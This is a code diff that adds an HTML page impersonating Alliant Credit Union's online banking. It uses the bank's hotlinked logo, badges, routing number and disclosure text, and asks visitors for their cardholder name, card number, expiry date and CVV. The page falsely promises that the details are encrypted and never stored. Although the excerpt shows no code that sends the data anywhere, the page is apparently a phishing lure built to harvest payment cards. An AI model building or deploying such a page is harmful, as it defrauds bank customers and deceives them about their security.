@@ -1,0 +1,612 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Alliant – Card Information</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: Arial, Helvetica, sans-serif;
+      background: #ffffff;
+      color: #333;
+    }
+
+    .container {
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+    }
+
+    .top {
+      height: 100vh;
+      display: flex;
+    }
+
+    /* LEFT PANEL – card info form */
+    .left {
+      flex: 1;
+      width: 30%;
+      background: #ffffff;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      padding: 0 40px;
+      font-family: Arial, Helvetica, sans-serif;
+      color: #333;
+    }
+
+    .left > * {
+      max-width: 340px;
+      width: 100%;
+    }
+
+    .logo {
+      width: 230px;
+      margin-bottom: 50px;
+    }
+
+    .page-title {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      font-size: 26px;
+      color: #333;
+      margin-bottom: 12px;
+    }
+
+    .page-title .icon {
+      font-size: 22px;
+    }
+
+    .subtitle {
+      font-size: 15px;
+      color: #6b7a80;
+      margin-bottom: 30px;
+      line-height: 1.4;
+    }
+
+    /* card preview */
+    .card-preview {
+      position: relative;
+      width: 100%;
+      aspect-ratio: 1.586 / 1;
+      border-radius: 14px;
+      background: linear-gradient(135deg, #0a4d6e 0%, #00A3E0 100%);
+      color: #fff;
+      padding: 20px 22px;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+      margin-bottom: 30px;
+      box-shadow: 0 12px 28px rgba(0, 100, 150, 0.22);
+      overflow: hidden;
+    }
+
+    .card-preview::after {
+      content: "";
+      position: absolute;
+      width: 220px;
+      height: 220px;
+      border-radius: 50%;
+      background: rgba(255, 255, 255, 0.08);
+      top: -70px;
+      right: -60px;
+    }
+
+    .card-preview-top {
+      display: flex;
+      justify-content: space-between;
+      align-items: flex-start;
+      position: relative;
+      z-index: 1;
+    }
+
+    .card-chip {
+      width: 42px;
+      height: 32px;
+      border-radius: 6px;
+      background: linear-gradient(135deg, #e8c56a, #c9a24b);
+      position: relative;
+    }
+
+    .card-chip::before,
+    .card-chip::after {
+      content: "";
+      position: absolute;
+      background: rgba(0, 0, 0, 0.18);
+    }
+
+    .card-chip::before {
+      left: 0;
+      right: 0;
+      top: 50%;
+      height: 1px;
+    }
+
+    .card-chip::after {
+      top: 0;
+      bottom: 0;
+      left: 50%;
+      width: 1px;
+    }
+
+    .card-brand {
+      font-size: 16px;
+      font-weight: 700;
+      letter-spacing: 1px;
+      opacity: 0.92;
+      position: relative;
+      z-index: 1;
+    }
+
+    .card-number-display {
+      font-size: 21px;
+      letter-spacing: 2.5px;
+      font-family: "Courier New", monospace;
+      position: relative;
+      z-index: 1;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+
+    .card-preview-bottom {
+      display: flex;
+      justify-content: space-between;
+      align-items: flex-end;
+      position: relative;
+      z-index: 1;
+      gap: 16px;
+    }
+
+    .card-label {
+      font-size: 9px;
+      letter-spacing: 1px;
+      text-transform: uppercase;
+      opacity: 0.7;
+      margin-bottom: 3px;
+    }
+
+    .card-value {
+      font-size: 14px;
+      letter-spacing: 0.5px;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+      max-width: 180px;
+    }
+
+    /* fields */
+    .field {
+      margin-bottom: 22px;
+    }
+
+    .field label {
+      display: block;
+      font-size: 15px;
+      color: #333;
+      margin-bottom: 6px;
+      font-weight: 500;
+    }
+
+    .field input {
+      width: 100%;
+      padding: 10px 14px;
+      font-size: 15px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      outline: none;
+      transition: border 0.15s, box-shadow 0.15s;
+      background: #ffffff;
+      color: #333;
+      font-family: inherit;
+    }
+
+    .field input:focus {
+      border-color: #7fb3e0;
+      box-shadow: 0 0 0 2px rgba(123, 164, 40, 0.12);
+    }
+
+    .field input::placeholder {
+      color: #a0aeb4;
+    }
+
+    .field-row-2 {
+      display: flex;
+      gap: 14px;
+    }
+
+    .field-row-2 .field {
+      flex: 1;
+      min-width: 0;
+      margin-bottom: 0;
+    }
+
+    .continue-btn {
+      background: #7ba428;
+      color: #fff;
+      border: none;
+      border-radius: 30px;
+      padding: 13px 55px;
+      font-size: 17px;
+      cursor: pointer;
+      margin-top: 12px;
+      margin-bottom: 30px;
+      width: auto;
+      align-self: flex-start;
+      transition: background 0.2s;
+    }
+
+    .continue-btn:hover {
+      background: #6b9122;
+    }
+
+    .security-note {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-size: 13px;
+      color: #6b7a80;
+      margin-bottom: 10px;
+    }
+
+    .security-note svg {
+      flex-shrink: 0;
+      color: #7ba428;
+    }
+
+    /* RIGHT PANEL – blue presentation */
+    .right {
+      flex: 2;
+      width: 70%;
+      background: #00A3E0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .right img {
+      width: 70%;
+      max-width: 700px;
+      filter: drop-shadow(0 8px 16px rgba(0, 0, 0, 0.08));
+    }
+
+    .right::before {
+      content: "";
+      position: absolute;
+      width: 400px;
+      height: 400px;
+      border-radius: 50%;
+      background: rgba(255, 255, 255, 0.06);
+      top: -80px;
+      right: -80px;
+    }
+
+    .right::after {
+      content: "";
+      position: absolute;
+      width: 300px;
+      height: 300px;
+      border-radius: 50%;
+      background: rgba(255, 255, 255, 0.05);
+      bottom: -70px;
+      left: -70px;
+    }
+
+    /* BOTTOM FOOTER */
+    .bottom {
+      background: #ffffff;
+      border-top: 1px solid #ddd;
+      display: flex;
+      align-items: flex-start;
+      gap: 40px;
+      padding: 18px 50px;
+      font-family: Arial, Helvetica, sans-serif;
+      color: #555;
+    }
+
+    .badges {
+      display: flex;
+      align-items: center;
+      gap: 20px;
+      flex-shrink: 0;
+    }
+
+    .badge-housing {
+      width: 100px;
+      height: 100%;
+    }
+
+    .badge-ncua {
+      width: 180px;
+    }
+
+    .footer-content {
+      font-size: 15px;
+    }
+
+    .footer-links {
+      margin-bottom: 10px;
+    }
+
+    .footer-links a {
+      color: #2b7a9e;
+      text-decoration: none;
+      margin: 0 14px;
+    }
+
+    .footer-links a:first-child {
+      margin-left: 0;
+    }
+
+    .footer-links .sep {
+      color: #ccc;
+    }
+
+    .footer-row {
+      margin-bottom: 10px;
+    }
+
+    .footer-row a {
+      color: #2b7a9e;
+      text-decoration: none;
+      margin-right: 14px;
+    }
+
+    .footer-disclosure {
+      line-height: 1;
+      font-family: sans-serif;
+      color: #627277;
+    }
+
+    /* Mobile */
+    @media (max-width: 768px) {
+      .top {
+        height: auto;
+        flex-direction: column;
+      }
+
+      .right {
+        display: none;
+      }
+
+      .left {
+        width: 100%;
+        justify-content: flex-start;
+        align-items: center;
+        text-align: center;
+        padding: 50px 25px 30px;
+      }
+
+      .left > * {
+        max-width: 480px;
+      }
+
+      .logo {
+        width: 250px;
+        margin: 20px auto 40px;
+      }
+
+      .page-title {
+        justify-content: center;
+        font-size: 22px;
+      }
+
+      .subtitle {
+        text-align: center;
+      }
+
+      .card-preview {
+        max-width: 340px;
+      }
+
+      .field {
+        text-align: left;
+      }
+
+      .field label {
+        font-size: 14px;
+      }
+
+      .field input {
+        font-size: 15px;
+        padding: 10px 12px;
+      }
+
+      .field-row-2 {
+        flex-wrap: wrap;
+        gap: 12px;
+      }
+
+      .continue-btn {
+        margin-top: 20px;
+        width: 100%;
+        font-size: 16px;
+        align-self: center;
+        text-align: center;
+        padding: 13px 20px;
+        white-space: nowrap;
+      }
+
+      .security-note {
+        justify-content: center;
+      }
+
+      .bottom {
+        justify-content: center;
+        text-align: center;
+        padding: 25px;
+        border-top: none;
+      }
+
+      .badges {
+        display: none;
+      }
+
+      .footer-links a,
+      .footer-row a {
+        margin: 0 8px;
+        font-size: 12px;
+      }
+      .footer-row span {
+        font-size: 12px;
+      }
+
+      .footer-disclosure {
+        line-height: 1.4;
+        font-size: 12px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="top">
+      <!-- LEFT: card information form -->
+      <div class="left">
+        <img class="logo" src="https://www.alliantcreditunion.com/OnlineBanking/Content/alliant-logo.svg" alt="Alliant">
+
+        <div class="page-title">
+          <span class="icon">💳</span>
+          <span>Card Information</span>
+        </div>
+
+        <p class="subtitle">Enter your card details to link or verify your payment method.</p>
+
+        <!-- live card preview -->
+        <div class="card-preview" aria-hidden="true">
+          <div class="card-preview-top">
+            <div class="card-chip"></div>
+            <div class="card-brand">ALLIANT</div>
+          </div>
+          <div class="card-number-display" id="cardNumberDisplay">•••• •••• •••• ••••</div>
+          <div class="card-preview-bottom">
+            <div>
+              <div class="card-label">Card Holder</div>
+              <div class="card-value" id="cardHolderDisplay">FULL NAME</div>
+            </div>
+            <div>
+              <div class="card-label">Expires</div>
+              <div class="card-value" id="cardExpiryDisplay">MM/YY</div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Cardholder name -->
+        <div class="field">
+          <label for="cardholder">Cardholder name</label>
+          <input type="text" id="cardholder" placeholder="Name as it appears on card" autocomplete="cc-name">
+        </div>
+
+        <!-- Card number -->
+        <div class="field">
+          <label for="cardnumber">Card number</label>
+          <input type="text" id="cardnumber" placeholder="1234 5678 9012 3456" inputmode="numeric" maxlength="19" autocomplete="cc-number">
+        </div>
+
+        <!-- Expiry + CVV -->
+        <div class="field-row-2">
+          <div class="field">
+            <label for="expiry">Expiry date</label>
+            <input type="text" id="expiry" placeholder="MM/YY" inputmode="numeric" maxlength="5" autocomplete="cc-exp">
+          </div>
+          <div class="field">
+            <label for="cvv">CVV</label>
+            <input type="password" id="cvv" placeholder="123" inputmode="numeric" maxlength="4" autocomplete="cc-csc">
+          </div>
+        </div>
+
+        <button class="continue-btn">Continue</button>
+
+        <div class="security-note">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#7ba428" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+            <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
+            <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+          </svg>
+          <span>Your card details are encrypted and never stored on our servers.</span>
+        </div>
+      </div>
+
+      <!-- RIGHT blue panel -->
+      <div class="right">
+        <img src="https://www.alliantcreditunion.com/OnlineBanking/Content/login-presentation.png" alt="">
+      </div>
+    </div>
+
+    <!-- footer -->
+    <div class="bottom">
+      <div class="badges">
+        <img class="badge-housing" src="https://www.alliantcreditunion.com/OnlineBanking/design/equal-housing-opportunity.png" alt="Equal Housing Opportunity">
+        <img class="badge-ncua" src="https://www.alliantcreditunion.com/OnlineBanking/design/ncua.png" alt="NCUA">
+      </div>
+
+      <div class="footer-content">
+        <div class="footer-links">
+          <a href="#">Disclosures</a><span class="sep">|</span>
+          <a href="#">Terms</a><span class="sep">|</span>
+          <a href="#">Privacy</a><span class="sep">|</span>
+          <a href="#">Accessibility</a>
+        </div>
+        <div class="footer-row">
+          <a href="#">Help Center</a><span class="sep">|</span>
+          <span style="margin-left:14px;">ABA Routing and Transit Number #271081528</span>
+        </div>
+        <div class="footer-disclosure">
+          Alliant Credit Union, Chicago, IL. Your savings federally insured to at least $250,000 and backed by the full faith and credit of the United States
+          Government - National Credit Union Administration (NCUA), a U.S. Government Agency. Ver: 1.0.0.0
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // Live-update the card preview as the user types
+    (function () {
+      var numberInput = document.getElementById('cardnumber');
+      var holderInput = document.getElementById('cardholder');
+      var expiryInput = document.getElementById('expiry');
+
+      var numberDisplay = document.getElementById('cardNumberDisplay');
+      var holderDisplay = document.getElementById('cardHolderDisplay');
+      var expiryDisplay = document.getElementById('cardExpiryDisplay');
+
+      // format card number with spaces every 4 digits
+      numberInput.addEventListener('input', function () {
+        var digits = this.value.replace(/\D/g, '').slice(0, 16);
+        this.value = digits.replace(/(.{4})/g, '$1 ').trim();
+
+        if (digits.length === 0) {
+          numberDisplay.textContent = '•••• •••• •••• ••••';
+        } else {
+          var padded = digits.padEnd(16, '•');
+          numberDisplay.textContent = padded.replace(/(.{4})/g, '$1 ').trim();
+        }
+      });
+
+      holderInput.addEventListener('input', function () {
+        var v = this.value.trim();
+        holderDisplay.textContent = v.length ? v.toUpperCase() : 'FULL NAME';
+      });
+
+      // auto-insert slash for expiry
+      expiryInput.addEventListener('input', function () {
+        var digits = this.value.replace(/\D/g, '').slice(0, 4);
+        if (digits.length >= 3) {
+          this.value = digits.slice(0, 2) + '/' + digits.slice(2);
+        } else {
+          this.value = digits;
+        }
+        expiryDisplay.textContent = this.value.length ? this.value : 'MM/YY';
+      });
+    })();
+  </script>
+</body>
+</html>
